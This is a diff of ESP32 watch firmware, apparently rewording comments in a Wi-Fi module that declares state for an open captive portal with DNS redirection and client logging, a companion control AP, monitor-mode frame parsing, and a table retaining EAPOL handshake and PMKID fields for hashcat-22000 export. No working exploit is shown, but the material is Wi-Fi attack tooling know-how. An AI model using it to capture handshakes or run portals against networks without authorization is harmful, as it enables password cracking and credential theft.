+ * cached and persisted to NVS, applied on Start. Given the single radio, AP
+ * mode is mutually exclusive with monitor/STA: do_ap_on suspends them, and the
+ * STA entry points call do_ap_off. */
+#define AP_CLI_MAX   10                                 /* the number of client rows tracked and published */
 #define AP_SSID_DEF  "NocSif-AP"
 typedef struct { uint8_t mac[6]; char ip[16]; int8_t rssi; } ap_cli_t;
 static volatile bool      s_ap_active;
 static char               s_ap_ssid[WIFI_SSID_MAX] = AP_SSID_DEF;
 static volatile int       s_ap_channel = 1;
 static volatile bool      s_ap_hidden;
-static int                s_ap_maxconn = 4;             /* default association cap             */
-static bool               s_ap_cfg_loaded;              /* NVS config primed once              */
-static bool               s_ap_prev_connected;          /* had a live STA link before AP       */
-static esp_netif_t       *s_ap_netif;                   /* default AP netif (DHCP server)      */
-static esp_timer_handle_t s_ap_timer;                   /* periodic client-list refresh        */
-static char               s_ap_ip[16];                  /* the AP's own IPv4 (gateway)         */
-static portMUX_TYPE       s_sap_mux = portMUX_INITIALIZER_UNLOCKED;  /* guards s_ap_ssid        */
-static ap_cli_t           s_ap_cli[2][AP_CLI_MAX];      /* published client snapshot (2-buffer)*/
+static int                s_ap_maxconn = 4;             /* the default association cap */
+static bool               s_ap_cfg_loaded;              /* whether the NVS config has been primed yet */
+static bool               s_ap_prev_connected;          /* whether there was a live STA link before AP mode started */
+static esp_netif_t       *s_ap_netif;                   /* the default AP netif, running the DHCP server */
+static esp_timer_handle_t s_ap_timer;                   /* the periodic client-list refresh timer */
+static char               s_ap_ip[16];                  /* the AP's own IPv4 address (its gateway) */
+static portMUX_TYPE       s_sap_mux = portMUX_INITIALIZER_UNLOCKED;  /* guards s_ap_ssid */
+static ap_cli_t           s_ap_cli[2][AP_CLI_MAX];      /* the published client snapshot, double-buffered */
 static int                s_ap_cli_cnt[2];
 static volatile int       s_ap_cli_i;
-static volatile uint32_t  s_ap_cli_gen;                 /* bumps on a membership change         */
+static volatile uint32_t  s_ap_cli_gen;                 /* bumps on a client membership change */
 
-/* §4.8a Companion — SSID override consulted by apply_ap_config(). The companion AP is OPEN (operator
- * call: no join gate), like the software AP + captive portal, but broadcasts its own device-name SSID.
- * The companion path sets this before bringing the AP up and clears it on teardown; software-AP/portal
- * start clears it too. "" = use the configured s_ap_ssid. */
-static char               s_ap_ssid_ov[WIFI_SSID_MAX];  /* "" = use s_ap_ssid; else this SSID   */
-/* §4.8a companion — optional WPA2 password for the companion AP (operator can secure the link). Staged
- * from NVS ("comp_pw") in do_companion_on, consulted by apply_ap_config, cleared on teardown. "" (or
- * < 8 chars, WPA2's minimum) = OPEN AP, as before. Only the companion session ever sets this. */
+/* Section 4.8a companion: an SSID override consulted by
+ * apply_ap_config(). The companion AP is open, an operator's own decision,
+ * with no join gate — like the software AP and captive portal — but it
+ * broadcasts its own device-name SSID instead. The companion path sets this
+ * before bringing the AP up and clears it on teardown; starting the software
+ * AP or portal separately also clears it. An empty string means: use the
+ * configured s_ap_ssid instead. */
+static char               s_ap_ssid_ov[WIFI_SSID_MAX];  /* "" means use s_ap_ssid; otherwise this SSID overrides it */
+/* Section 4.8a companion: an optional WPA2 password for the companion
+ * AP, letting the operator secure the link if they choose. Staged from NVS
+ * ("comp_pw") in do_companion_on, consulted by apply_ap_config, and cleared
+ * on teardown. "" or fewer than 8 characters (WPA2's minimum) means an open
+ * AP, as before. Only the companion session ever sets this. */
 #define K_COMP_PW           "comp_pw"
 static char               s_ap_pass_ov[64];
 
-/* Captive portal state (M5-P5·4, active — authorized testing). A UDP:53 DNS redirector (its own task)
- * + an esp_http_server that serves a landing page (from /sd, else a built-in notice) for every request
- * and records each client interaction to a RAM ring (for the UI) + /sd/nocsif/wifi/portal-NNN.log.
- * Layered on the open software AP; cannot outlive it (ap_teardown stops it). */
-#define PORTAL_LOG_MAX   10                             /* recent interactions kept for the UI  */
+/* Captive portal state (M5-P5.4, active — authorized testing). A UDP:53
+ * DNS redirector, running in its own task, plus an esp_http_server that
+ * serves a landing page (from /sd, or a built-in notice if that's missing)
+ * for every request, recording each client interaction both to a RAM ring
+ * (for the UI) and to /sd/nocsif/wifi/portal-NNN.log. Layered on top of the
+ * open software AP, and can never outlive it — ap_teardown stops it too. */
+#define PORTAL_LOG_MAX   10                             /* the number of recent interactions kept for the UI */
 #define PORTAL_LOG_LINE  80
-#define PORTAL_PAGE_MAX  8192                           /* max landing-page bytes read from /sd */
-#define PORTAL_DIR       "/sd/nocsif/wifi/portals"      /* landing-page library on the card     */
-#define PT_SEL_MAX       64                             /* selected page filename buffer        */
-static void               portal_stop(void);            /* fwd (used by ap_teardown)            */
-static char               s_portal_page_sel[PT_SEL_MAX];/* chosen page filename ("" = built-in) */
-static bool               s_portal_sel_loaded;          /* selection primed from NVS            */
+#define PORTAL_PAGE_MAX  8192                           /* the maximum landing-page bytes read from /sd */
+#define PORTAL_DIR       "/sd/nocsif/wifi/portals"      /* the landing-page library available on the card */
+#define PT_SEL_MAX       64                             /* buffer for the selected page's filename */
+static void               portal_stop(void);            /* forward declaration, used by ap_teardown */
+static char               s_portal_page_sel[PT_SEL_MAX];/* the chosen page's filename; "" means built-in */
+static bool               s_portal_sel_loaded;          /* whether the selection has been primed from NVS */
 static volatile bool      s_portal_active;
 static httpd_handle_t     s_httpd;
 static int                s_dns_sock = -1;
 static volatile bool      s_dns_run;
 static TaskHandle_t       s_dns_task;
-static bool               s_portal_sd_ok;               /* SD claimed for this session          */
-static volatile bool      s_portal_page_tried;          /* page load attempted (httpd task)     */
-static char              *s_portal_page;                /* landing page (PSRAM); NULL = built-in */
+static bool               s_portal_sd_ok;               /* whether the SD card was claimed for this session */
+static volatile bool      s_portal_page_tried;          /* whether loading the page has been attempted, on the httpd task */
+static char              *s_portal_page;                /* the landing page's bytes, in PSRAM; NULL means built-in */
 static int                s_portal_page_len;
-static char               s_portal_logpath[64];         /* resolved on the httpd task           */
+static char               s_portal_logpath[64];         /* resolved on the httpd task */
 static volatile uint32_t  s_portal_hits;
 static volatile uint32_t  s_portal_gen;
 static portMUX_TYPE       s_portal_mux = portMUX_INITIALIZER_UNLOCKED;
 static char               s_portal_log[PORTAL_LOG_MAX][PORTAL_LOG_LINE];
-static int                s_portal_log_head;            /* ring write index                     */
+static int                s_portal_log_head;            /* the ring's write index */
 static int                s_portal_log_cnt;
 
-/* §4.8a Companion control surface (L4) — P1 transport. An OPEN SoftAP (operator call: no join gate) +
- * mDNS `nocsif.local` + a routed esp_http_server (its OWN handle, distinct from the captive portal's
- * wildcard server, with which it is mutually exclusive). Anyone on the AP can control the watch — the
- * off-by-default toggle + the on-watch "linked" indicator are the guardrails. Written only by the
- * worker; read by the LVGL getters after `s_comp_active` is set (single writer + the active flag as a
- * barrier, mirroring the portal getters). */
-#define COMP_HOST        "nocsif"                        /* -> nocsif.local                      */
-static void               companion_stop(void);          /* fwd (used by ap_teardown)            */
-static httpd_handle_t     s_comp_httpd;                  /* companion HTTP server (:80, routed)  */
-static volatile bool      s_comp_active;                 /* surface is up                        */
-static bool               s_comp_owns_ap;                /* companion brought the AP up (tear on off) */
-static bool               s_mdns_up;                     /* mDNS responder running               */
-static char               s_comp_ssid[WIFI_SSID_MAX];    /* open-AP SSID clients join (device name) */
-static nocsif_companion_cmd_fn_t s_comp_cmd_fn;          /* P2: UI-registered command handler    */
-static nocsif_companion_json_fn_t s_comp_menu_fn;        /* P2 redesign: /api/menu provider      */
-static nocsif_companion_json_fn_t s_comp_state_fn;       /* P3: live-state provider (ping + /ws) */
-static nocsif_companion_touch_fn_t s_comp_touch_fn;      /* interactive: WS uplink → remote pointer */
+/* Section 4.8a companion control surface (L4), P1 transport. An open
+ * SoftAP — an operator's own decision, with no join gate — plus an mDNS
+ * responder for nocsif.local, plus a routed esp_http_server (its own handle,
+ * distinct from the captive portal's wildcard server, with which it's
+ * mutually exclusive). Anyone on the AP can control the watch; the off-by-
+ * default toggle plus the on-watch "linked" indicator are the intended
+ * guardrails. Written only by the worker, and read by the LVGL getters only
+ * after s_comp_active is set, mirroring the portal getters' single-writer-
+ * plus-active-flag-as-barrier pattern. */
+#define COMP_HOST        "nocsif"                        /* resolves to nocsif.local */
+static void               companion_stop(void);          /* forward declaration, used by ap_teardown */
+static httpd_handle_t     s_comp_httpd;                  /* the companion's own HTTP server, on port 80, routed */
+static volatile bool      s_comp_active;                 /* whether the surface is currently up */
+static bool               s_comp_owns_ap;                /* whether the companion itself brought the AP up, so it should tear it down again on off */
+static bool               s_mdns_up;                     /* whether the mDNS responder is running */
+static char               s_comp_ssid[WIFI_SSID_MAX];    /* the open-AP SSID clients join, which is the device name */
+static nocsif_companion_cmd_fn_t s_comp_cmd_fn;          /* P2: the UI-registered command handler */
+static nocsif_companion_json_fn_t s_comp_menu_fn;        /* P2 redesign: the /api/menu provider */
+static nocsif_companion_json_fn_t s_comp_state_fn;       /* P3: the live-state provider, backing /api/ping and /ws */
+static nocsif_companion_touch_fn_t s_comp_touch_fn;      /* interactive control: the WS uplink feeding the remote pointer */
 
-/* ---- §4.8a Companion — P3 live push (watch → phone over WebSocket) ---------------------------- *
- * The companion server keeps a small set of connected /ws client sockets; an esp_timer fires ~2×/s and
- * queues (httpd_queue_work) a state frame to each so the page can live-sync toggles/sliders and raise
- * the phone's native keyboard when a watch text field is focused. Sockets are added on the WS handshake
- * and pruned on any send error. All WS I/O happens on the httpd task (via httpd_queue_work). */
+/* ---- section 4.8a companion, P3 live push (watch to phone over
+ * WebSocket) ---- * The companion server keeps a small set of connected /ws
+ * client sockets; an esp_timer fires roughly twice a second and queues (via
+ * httpd_queue_work) a state frame to each, so the page can live-sync toggles
+ * and sliders and raise the phone's native keyboard whenever a watch text
+ * field has focus. Sockets are added on the WS handshake and pruned on any
+ * send error. All WS I/O happens on the httpd task, via httpd_queue_work. */
 #define COMP_WS_MAX 4
-static int                s_ws_fds[COMP_WS_MAX];         /* connected /ws client sockfds (0 = empty) */
-static esp_timer_handle_t s_ws_timer;                    /* periodic state-push timer               */
+static int                s_ws_fds[COMP_WS_MAX];         /* connected /ws client socket fds; 0 means an empty slot */
+static esp_timer_handle_t s_ws_timer;                    /* the periodic state-push timer */
 
-/* P3 screen mirror: the UI publishes an RGB565 thumbnail here; the push loop sends it as a BINARY /ws
- * frame when it is new. One PSRAM buffer (header + payload) guarded by a mutex (UI task writes, httpd
- * task reads); a seq counter lets the loop skip resending an unchanged frame. */
-#define COMP_THUMB_MAX  (220 * 270 * 2 + 8)              /* header(8) + max RGB565 payload (mirror 205x251 fits) */
-static uint8_t           *s_thumb;                       /* PSRAM: 8-byte header + RGB565-LE payload */
-static int                s_thumb_len;                   /* valid bytes in s_thumb (0 = none yet)   */
-static uint32_t           s_thumb_seq;                   /* bumped on each publish                   */
-static uint32_t           s_thumb_sent_seq;              /* last seq queued to clients              */
+/* P3 screen mirror: the UI publishes an RGB565 thumbnail here, and the
+ * push loop sends it as a binary /ws frame whenever it's new. A single PSRAM
+ * buffer (header plus payload), guarded by a mutex — the UI task writes, the
+ * httpd task reads — with a sequence counter letting the loop skip resending
+ * an unchanged frame. */
+#define COMP_THUMB_MAX  (220 * 270 * 2 + 8)              /* the 8-byte header plus the maximum RGB565 payload; the 205x251 mirror fits within it */
+static uint8_t           *s_thumb;                       /* in PSRAM: an 8-byte header plus the RGB565-LE payload */
+static int                s_thumb_len;                   /* the number of valid bytes in s_thumb; 0 means none yet */
+static uint32_t           s_thumb_seq;                   /* bumped on every publish */
+static uint32_t           s_thumb_sent_seq;              /* the last sequence number already queued to clients */
 static SemaphoreHandle_t  s_thumb_mtx;
 
-/* ---- passive parser state (M5-P3) ------------------------------------------------- *
- * The rx callback (WiFi task) is the single producer; a dedicated parser task is the single
- * consumer. An SPSC slot-ring (PSRAM) carries raw frame bytes across; the index handoff uses
- * release/acquire so a filled slot is visible before its publish. The nearby-AP table is
- * written by the parser and read by the LVGL task under a short spinlock. */
+/* ---- passive parser state (M5-P3) ---- *
+ * The rx callback, on the WiFi task, is the single producer; a dedicated
+ * parser task is the single consumer. An SPSC slot ring in PSRAM carries raw
+ * frame bytes between them, with the index handoff using release/acquire
+ * ordering so a filled slot is visible before its publish. The nearby-AP
+ * table is written by the parser and read by the LVGL task under a short
+ * spinlock. */
 typedef struct {
-    int64_t  ts_us;                 /* capture time (esp_timer_get_time)                 */
+    int64_t  ts_us;                 /* capture time, from esp_timer_get_time */
     int8_t   rssi;
-    uint8_t  channel;               /* rx channel (1..13)                                */
-    uint8_t  pkt_type;              /* wifi_promiscuous_pkt_type_t                       */
-    uint16_t orig_len;              /* full frame length (incl. FCS)                     */
-    uint16_t cap_len;              /* bytes actually copied (<= CAP_SNAP)                */
+    uint8_t  channel;               /* rx channel (1..13) */
+    uint8_t  pkt_type;              /* a wifi_promiscuous_pkt_type_t value */
+    uint16_t orig_len;              /* the full frame length, including the FCS */
+    uint16_t cap_len;              /* bytes actually copied, at most CAP_SNAP */
     uint8_t  data[CAP_SNAP];
 } cap_slot_t;
 
-static cap_slot_t       *s_ring;                 /* PSRAM, CAP_SLOTS entries (lazy)      */
-static volatile uint32_t s_ring_head;            /* consumer index (parser)              */
-static volatile uint32_t s_ring_tail;            /* producer index (rx cb)               */
-static volatile uint32_t s_ring_drop;            /* frames dropped (ring full)           */
-static volatile bool     s_parse_active;         /* rx cb copies + parser decodes        */
+static cap_slot_t       *s_ring;                 /* in PSRAM, CAP_SLOTS entries, allocated lazily */
+static volatile uint32_t s_ring_head;            /* the consumer index, owned by the parser */
+static volatile uint32_t s_ring_tail;            /* the producer index, owned by the rx callback */
+static volatile uint32_t s_ring_drop;            /* frames dropped because the ring was full */
+static volatile bool     s_parse_active;         /* frames the rx callback copied in and the parser decoded */
 static TaskHandle_t      s_parse_task;
 
-/* Nearby-AP table (parser writes, LVGL reads; guarded by s_ap_mux). */
+/* The nearby-AP table; the parser writes it, the LVGL task reads it, guarded by s_ap_mux. */
 typedef struct {
     bool     used;
     uint8_t  bssid[6];
-    char     ssid[WIFI_SSID_MAX];   /* "" = hidden                                       */
+    char     ssid[WIFI_SSID_MAX];   /* "" means hidden */
     uint8_t  channel;
     int8_t   rssi;
-    uint8_t  sec;                   /* nocsif_wifi_sec_t                                 */
+    uint8_t  sec;                   /* a nocsif_wifi_sec_t value */
     uint16_t frames;
     int64_t  last_us;
     char     vendor[12];
@@ -403,15 +440,16 @@ typedef struct {
 
 static mon_ap_t          s_mon_ap[MON_AP_MAX];
 static int               s_mon_ap_cnt;
-static volatile uint32_t s_mon_ap_gen;           /* bumps on insert / evict (structural) */
+static volatile uint32_t s_mon_ap_gen;           /* bumps on an insert or eviction, i.e. a structural change */
 static portMUX_TYPE      s_ap_mux = portMUX_INITIALIZER_UNLOCKED;
 
-/* Station table (M5-P3·2): a client device seen in a data frame, mapped to its AP. Parser
- * writes, LVGL reads; shares s_ap_mux (short critical sections, low contention). */
+/* Station table (M5-P3.2): a client device seen in a data frame, mapped
+ * to its AP. The parser writes it and the LVGL task reads it, sharing
+ * s_ap_mux since both use short critical sections with low contention. */
 typedef struct {
     bool     used;
     uint8_t  mac[6];
-    uint8_t  bssid[6];              /* the AP this station is talking to (all-zero if none) */
+    uint8_t  bssid[6];              /* the AP this station is talking to; all-zero if none */
     uint8_t  channel;
     int8_t   rssi;
     uint16_t frames;
@@ -422,11 +460,11 @@ static mon_sta_t         s_mon_sta[MON_STA_MAX];
 static int               s_mon_sta_cnt;
 static volatile uint32_t s_mon_sta_gen;
 
-/* Probe-request table (M5-P3·2): a (device, requested-SSID) pair. */
+/* Probe-request table (M5-P3.2): a (device, requested-SSID) pair. */
 typedef struct {
     bool     used;
     uint8_t  mac[6];
-    char     ssid[WIFI_SSID_MAX];   /* "" = a broadcast / wildcard probe                 */
+    char     ssid[WIFI_SSID_MAX];   /* "" means a broadcast/wildcard probe */
     int8_t   rssi;
     uint16_t count;
     int64_t  last_us;
@@ -436,27 +474,28 @@ static mon_probe_t       s_mon_probe[MON_PROBE_MAX];
 static int               s_mon_probe_cnt;
 static volatile uint32_t s_mon_probe_gen;
 
-/* Key-exchange table (M5-P4·1): one BSSID's observed EAPOL 4-way progress + any advertised PMKID.
- * Parser writes, LVGL reads; shares s_ap_mux. The M5 "hc22000 export" (passive polish) also retains
- * the client MAC + the fields a hashcat-22000 line needs: the ANonce from message 1, and the MIC +
- * the raw EAPOL bytes from message 2. */
-#define HS_EAPOL_MAX 160               /* captured M2 EAPOL frame bytes (header + key frame)  */
+/* Key-exchange table (M5-P4.1): one BSSID's observed EAPOL 4-way
+ * progress plus any advertised PMKID. The parser writes it, the LVGL task
+ * reads it, sharing s_ap_mux. The M5 "hc22000 export" (passive polish) also
+ * retains the client MAC plus the fields a hashcat-22000 line needs: the
+ * ANonce from message 1, and the MIC plus raw EAPOL bytes from message 2. */
+#define HS_EAPOL_MAX 160               /* the captured message-2 EAPOL frame bytes: header plus key frame */
 typedef struct {
     bool     used;
     uint8_t  bssid[6];
-    uint8_t  sta[6];                /* the client in the exchange                        */
+    uint8_t  sta[6];                /* the client involved in the exchange */
     bool     have_sta;
-    uint8_t  msg_mask;              /* bit0=msg1 … bit3=msg4 of the 4-way exchange seen   */
+    uint8_t  msg_mask;              /* which messages of the 4-way exchange were seen: bit0=msg1 through bit3=msg4 */
     bool     has_pmkid;
     uint8_t  pmkid[16];
     bool     have_anonce;
-    uint8_t  anonce[32];           /* from message 1 (AP nonce)                          */
+    uint8_t  anonce[32];           /* taken from message 1: the AP's nonce */
     bool     have_mic;
-    uint8_t  mic[16];              /* from message 2                                     */
-    uint8_t  eapol[HS_EAPOL_MAX];  /* the message-2 EAPOL frame, MIC field zeroed        */
+    uint8_t  mic[16];              /* taken from message 2 */
+    uint8_t  eapol[HS_EAPOL_MAX];  /* the message-2 EAPOL frame, with its MIC field zeroed */
     uint8_t  eapol_len;
     int8_t   rssi;
-    uint16_t frames;                /* EAPOL frames seen for this BSSID                   */
+    uint16_t frames;                /* EAPOL frames seen for this BSSID */
     int64_t  last_us;
     char     vendor[12];
 } mon_hs_t;
@@ -464,50 +503,55 @@ static mon_hs_t          s_mon_hs[MON_HS_MAX];
 static int               s_mon_hs_cnt;
 static volatile uint32_t s_mon_hs_gen;
 
-/* PCAP capture (M5-P3·3): a SEPARATE all-frames SPSC ring (rx cb = producer) drained by a
- * dedicated big-stack writer task that owns the FILE*. Kept independent of the parser ring so
- * PCAP snaplen/rate never perturbs the identity tables. */
+/* PCAP capture (M5-P3.3): a separate all-frames SPSC ring, with the rx
+ * callback as producer, drained by a dedicated big-stack writer task that
+ * owns the FILE*. Kept independent of the parser ring so PCAP's snaplen and
+ * rate never perturb the identity tables. */
 typedef struct {
     int64_t  ts_us;
     int8_t   rssi;
     uint8_t  channel;
-    uint16_t orig_len;              /* full on-air frame length (before snaplen truncation) */
-    uint16_t cap_len;              /* bytes actually copied (<= PCAP_SNAP)                  */
+    uint16_t orig_len;              /* the full on-air frame length, before snaplen truncation */
+    uint16_t cap_len;              /* bytes actually copied, at most PCAP_SNAP */
     uint8_t  data[PCAP_SNAP];
 } pcap_slot_t;
 
-static pcap_slot_t      *s_pcap_ring;             /* PSRAM, PCAP_SLOTS entries (lazy)     */
-static volatile uint32_t s_pcap_head;             /* consumer index (writer task)         */
-static volatile uint32_t s_pcap_tail;             /* producer index (rx cb)               */
-static volatile uint32_t s_pcap_drop;             /* frames dropped (ring full)           */
-static volatile bool     s_pcap_active;           /* rx cb copies + writer drains         */
-static volatile bool     s_pcap_want;             /* requested on/off (writer owns close) */
-static volatile bool     s_pcap_idle = true;      /* writer parked (no open file) -> safe to delete */
+static pcap_slot_t      *s_pcap_ring;             /* in PSRAM, PCAP_SLOTS entries, allocated lazily */
+static volatile uint32_t s_pcap_head;             /* the consumer index, owned by the writer task */
+static volatile uint32_t s_pcap_tail;             /* the producer index, owned by the rx callback */
+static volatile uint32_t s_pcap_drop;             /* frames dropped because the ring was full */
+static volatile bool     s_pcap_active;           /* frames the rx callback copied in and the writer drained */
+static volatile bool     s_pcap_want;             /* the requested on/off state; the writer owns closing the file */
+static volatile bool     s_pcap_idle = true;      /* whether the writer is parked with no open file, meaning it's safe to delete */
 static TaskHandle_t      s_pcap_task;
-static volatile uint32_t s_pcap_frames;           /* frames written this session          */
-static volatile uint32_t s_pcap_bytes;            /* bytes written (incl. headers)        */
-static char              s_pcap_path[64];         /* current/last file (writer + LVGL read)*/
+static volatile uint32_t s_pcap_frames;           /* frames written this session */
+static volatile uint32_t s_pcap_bytes;            /* bytes written, including headers */
+static char              s_pcap_path[64];         /* the current or last file path, written by the writer and read by the LVGL task */
 typedef enum { PCAP_OFF = 0, PCAP_REC, PCAP_NOSD, PCAP_FILESHARE, PCAP_ERR,
-               PCAP_STREAM,                       /* M5-P5+ live-streaming to USB-CDC          */
-               PCAP_NOHOST } pcap_state_t;         /* M5-P5+ armed for CDC, waiting for a host  */
+               PCAP_STREAM,                       /* M5-P5+ live streaming to USB-CDC */
+               PCAP_NOHOST } pcap_state_t;         /* M5-P5+ armed for CDC, waiting for a host to connect */
 static volatile int      s_pcap_state = PCAP_OFF;
 
-/* Live-PCAP sink (M5-P5+): the shared writer drains either to an SD file (SD, the P3·3 recorder) or
- * to the USB CDC serial port as a live stream (CDC) that a host reads in real time (Wireshark via
- * the bundled extcap). One sink at a time — both share the single ring + writer task. */
+/* Live-PCAP sink (M5-P5+): the shared writer drains to either an SD
+ * file (SD, the P3.3 recorder) or the USB CDC serial port as a live stream
+ * (CDC) that a host reads in real time via the bundled extcap plugin for
+ * Wireshark. Only one sink is active at a time — both share the single ring
+ * and writer task. */
 typedef enum { PCAP_SINK_SD = 0, PCAP_SINK_CDC } pcap_sink_t;
 static volatile int      s_pcap_sink = PCAP_SINK_SD;
 
-/* PCAP capture filter (M5-P4·1): FULL writes every captured frame (P3·3 behaviour); EAPOL writes
- * only EAPOL data frames + the beacon/probe-response that names a network, to hs-NNN.pcap. Set
- * before arming the shared writer; the rx copy-out and the file-name prefix read it. */
+/* PCAP capture filter (M5-P4.1): FULL writes every captured frame,
+ * matching the original P3.3 behavior; EAPOL writes only EAPOL data frames
+ * plus the beacon/probe-response that names the network, into hs-NNN.pcap.
+ * Set before arming the shared writer; both the rx copy-out and the
+ * filename prefix read it. */
 typedef enum { PCAP_FILTER_FULL = 0, PCAP_FILTER_EAPOL } pcap_filter_t;
 static volatile int      s_pcap_filter = PCAP_FILTER_FULL;
 
-static void parse_frame(const cap_slot_t *s);  /* decode one captured frame -> AP/sta/probe */
-static void pcap_stop_and_free(void);          /* stop PCAP + reclaim the writer task stack   */
+static void parse_frame(const cap_slot_t *s);  /* decodes one captured frame into the AP/station/probe tables */
+static void pcap_stop_and_free(void);          /* stops PCAP capture and reclaims the writer task's stack */
 
-/* ---- getters ---------------------------------------------------------------------- */
+/* ---- getters ---- */
 bool        nocsif_wifi_available(void)   { return s_available; }
 bool        nocsif_wifi_enabled(void)     { return s_enabled; }
 bool        nocsif_wifi_connected(void)   { return s_connected; }
@@ -526,7 +570,7 @@ int         nocsif_wifi_ap_count(void)    { return s_ap_cnt[s_ap_i]; }
 
 bool nocsif_wifi_ap_get(int idx, nocsif_wifi_ap_t *out)
 {
-    int i = s_ap_i;                       /* sample once: the buffer + its count agree */
+    int i = s_ap_i;                       /* sample once, so the buffer and its count agree */
     if (out == NULL || idx < 0 || idx >= s_ap_cnt[i]) {
         return false;
     }
@@ -555,10 +599,10 @@ const char *nocsif_wifi_authmode_str(uint8_t authmode)
     }
 }
 
-/* ---- saved-profile getters (RAM cache; LVGL-task-safe) ----------------------------- */
+/* ---- saved-profile getters: RAM-cached, safe on the LVGL task ---- */
 int nocsif_wifi_saved_count(void) { return s_sv_cnt; }
 
-/* ---- §4.6 Governor P3 places (BSSID-keyed) — plain reads are LVGL/timer-safe ------------------- */
+/* ---- section 4.6 Governor P3 places, keyed by BSSID; plain reads are LVGL/timer-safe ---- */
 int nocsif_wifi_saved_index(const char *ssid)
 {
     if (ssid == NULL || ssid[0] == '\0') return -1;
@@ -587,7 +631,7 @@ static int place_find_bssid(const uint8_t bssid[6])
     return -1;
 }
 
-/* The connected AP's BSSID (esp_wifi_sta_get_ap_info is thread-safe; ~a round trip to the WiFi task). */
+/* The connected AP's BSSID; esp_wifi_sta_get_ap_info is thread-safe, roughly a round trip to the WiFi task. */
 static bool connected_bssid(uint8_t out[6])
 {
     if (!s_connected) return false;
@@ -636,7 +680,7 @@ static void load_places(void)
     if (s_pl_cnt) ESP_LOGI(TAG, "places: %d learned", s_pl_cnt);
 }
 
-/* Forgetting a network drops the places learned under its SSID. */
+/* Forgetting a network also drops the places learned under its SSID. */
 static void places_drop_ssid(const char *ssid)
 {
     bool changed = false;
@@ -652,8 +696,10 @@ static void places_drop_ssid(const char *ssid)
     if (changed) persist_places();
 }
 
-/* Worker-side (pinned task — the NVS write belongs here): stamp the CONNECTED AP as a place — a new
- * BSSID inserts (oldest evicted when full), a known one moves only when the fix is GEO_RESTAMP_M away. */
+/* Worker-side only, since this is a pinned task and the NVS write
+ * belongs here: stamps the currently connected AP as a place — a new BSSID
+ * gets inserted (oldest evicted if full), while an already-known one only
+ * moves if the fix is GEO_RESTAMP_M away from the stored location. */
 static void do_geo_stamp(int32_t lat_ud, int32_t lon_ud)
 {
     uint8_t b[6];
@@ -663,11 +709,11 @@ static void do_geo_stamp(int32_t lat_ud, int32_t lon_ud)
         double mlat = ((double)lat_ud + (double)s_pl[idx].lat_ud) * 0.5e-6 * (3.14159265358979 / 180.0);
         double dy = ((double)lat_ud - (double)s_pl[idx].lat_ud) * 1e-6 * 111320.0;
         double dx = ((double)lon_ud - (double)s_pl[idx].lon_ud) * 1e-6 * 111320.0 * cos(mlat);
-        if (sqrt(dx * dx + dy * dy) < GEO_RESTAMP_M) return;              /* same place — keep the stamp */
+        if (sqrt(dx * dx + dy * dy) < GEO_RESTAMP_M) return;              /* the same place as before: keep the existing stamp */
     } else {
         if (s_pl_cnt < WIFI_MAX_PLACES) {
             idx = s_pl_cnt++;
-        } else {                                                           /* full: evict the oldest */
+        } else {                                                           /* the table is full: evict the oldest entry */
             for (int j = 0; j < WIFI_MAX_PLACES - 1; j++) s_pl[j] = s_pl[j + 1];
             idx = WIFI_MAX_PLACES - 1;
         }
@@ -715,9 +761,10 @@ const char *nocsif_wifi_pass_of(const char *ssid)
     return "";
 }
 
-/* ---- string state helper ---------------------------------------------------------- */
-/* Recompute the compact status + detail line from the current flags. Called after every
- * transition so the UI (which just reads the strings) always reflects reality. */
+/* ---- string state helper ---- */
+/* Recomputes the compact status and detail line from the current flags.
+ * Called after every state transition, so the UI — which only ever reads
+ * these strings — always reflects the actual current state. */
 static void refresh_strings(void)
 {
     if (!s_enabled && !s_scanning) {
@@ -748,7 +795,7 @@ static void refresh_strings(void)
     }
     if (s_scanning) {
         publish_status("scan");
-        publish_detail("Scanning for networks...");   /* "…" */
+        publish_detail("Scanning for networks...");   /* an ellipsis */
         return;
     }
     if (s_connected) {
@@ -777,7 +824,7 @@ static void refresh_strings(void)
     publish_detail(s_ssid[0] ? "On \xC2\xB7 not connected" : "On \xC2\xB7 no saved network");
 }
 
-/* ---- credential persistence ------------------------------------------------------- */
+/* ---- credential persistence ---- */
 static void load_creds(void)
 {
     nocsif_settings_get_str(K_SSID, s_ssid, sizeof s_ssid, "");
@@ -793,7 +840,7 @@ static void persist_creds(void)
     ESP_LOGI(TAG, "creds persisted for \"%s\"", s_ssid);
 }
 
-/* ---- saved network profiles (SSID + passphrase list) ------------------------------- */
+/* ---- saved network profiles: an SSID plus passphrase list ---- */
 static void persist_saved(void)
 {
     nocsif_settings_set_i32(K_SV_CNT, s_sv_cnt);
@@ -814,8 +861,8 @@ static void load_saved(void)
         snprintf(k, sizeof k, "wn_s%d", i); nocsif_settings_get_str(k, s_sv_ssid[i], sizeof s_sv_ssid[i], "");
         snprintf(k, sizeof k, "wn_p%d", i); nocsif_settings_get_str(k, s_sv_pass[i], sizeof s_sv_pass[i], "");
     }
-    load_places();                                          /* §4.6 P3: the BSSID-keyed places table */
-    /* Migrate the legacy single-slot credential into the list so the current network survives. */
+    load_places();                                          /* section 4.6 P3: the BSSID-keyed places table */
+    /* Migrates the legacy single-slot credential into the new list, so the current network survives the upgrade. */
     if (s_sv_cnt == 0 && s_ssid[0]) {
         snprintf(s_sv_ssid[0], sizeof s_sv_ssid[0], "%s", s_ssid);
         snprintf(s_sv_pass[0], sizeof s_sv_pass[0], "%s", s_pass);
@@ -825,7 +872,7 @@ static void load_saved(void)
     ESP_LOGI(TAG, "saved networks: %d", s_sv_cnt);
 }
 
-/* Remember (or update the passphrase of) a network. Evicts the oldest if the list is full. */
+/* Remembers a network, or updates its passphrase if already known. Evicts the oldest entry if the list is full. */
 static void upsert_saved(const char *ssid, const char *pass)
 {
     if (ssid == NULL || ssid[0] == '\0') {
@@ -841,7 +888,7 @@ static void upsert_saved(const char *ssid, const char *pass)
     int slot;
     if (s_sv_cnt < WIFI_MAX_SAVED) {
         slot = s_sv_cnt++;
-    } else {                                   /* full: drop the oldest (slot 0), shift down */
+    } else {                                   /* the list is full: drop the oldest entry (slot 0) and shift everything down */
         for (int j = 0; j < WIFI_MAX_SAVED - 1; j++) {
             memcpy(s_sv_ssid[j], s_sv_ssid[j + 1], sizeof s_sv_ssid[j]);
             memcpy(s_sv_pass[j], s_sv_pass[j + 1], sizeof s_sv_pass[j]);
@@ -865,18 +912,18 @@ static void remove_saved(const char *ssid)
             }
             s_sv_cnt--;
             persist_saved();
-            places_drop_ssid(ssid);                          /* §4.6 P3: its learned places go too */
+            places_drop_ssid(ssid);                          /* section 4.6 P3: its learned places go too */
             return;
         }
     }
 }
 
